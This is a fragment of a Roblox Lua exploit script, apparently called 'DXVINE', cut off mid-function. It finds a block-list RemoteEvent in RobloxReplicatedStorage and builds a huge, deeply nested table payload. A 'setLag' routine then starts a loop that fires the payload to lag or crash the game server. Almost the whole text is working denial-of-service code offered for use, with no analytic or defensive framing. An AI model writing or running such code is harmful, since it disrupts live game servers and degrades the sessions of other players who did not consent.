    local REP_CAP          = 12000
    
    local function findRemote()
    	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    	if not rrs then return nil end
    	local rem
    	for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
    		local r = rrs:FindFirstChild(name)
    		if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
    			rem = r break
    		end
    	end
    	if not rem then
    		for _, c in ipairs(rrs:GetChildren()) do
    			if (c:IsA("RemoteEvent") or c:IsA("UnreliableRemoteEvent")) and c.Name:find("Block") then
    				rem = c break
    			end
    		end
    	end
    	return rem
    end
    
    remote = findRemote()
    
    local function buildPayload(p)
    	local mainTbl = {}
    	local nested = {{}}
    	local current = nested[1]
    	for _ = 1, DEPTH do
    		local n = {}
    		table.insert(current, n)
    		current = n
    	end
    	local scaledPower = p * POWER_MULTIPLIER
    	local maxRep = math.min(math.floor(scaledPower / (DEPTH + 2)), REP_CAP)
    	for _ = 1, maxRep do table.insert(mainTbl, nested) end
    	return mainTbl
    end
    
    local function setLag(state)
    	running = state
    	if running then
    		if not remote or not remote.Parent then remote = findRemote() end
    		if loopTask then pcall(task.cancel, loopTask) end
    		payload = buildPayload(power)
    		print("[DXVINE] START | power=" .. power .. " | reps=" .. #payload .. " | delay=" .. FIXED_DELAY .. "s")
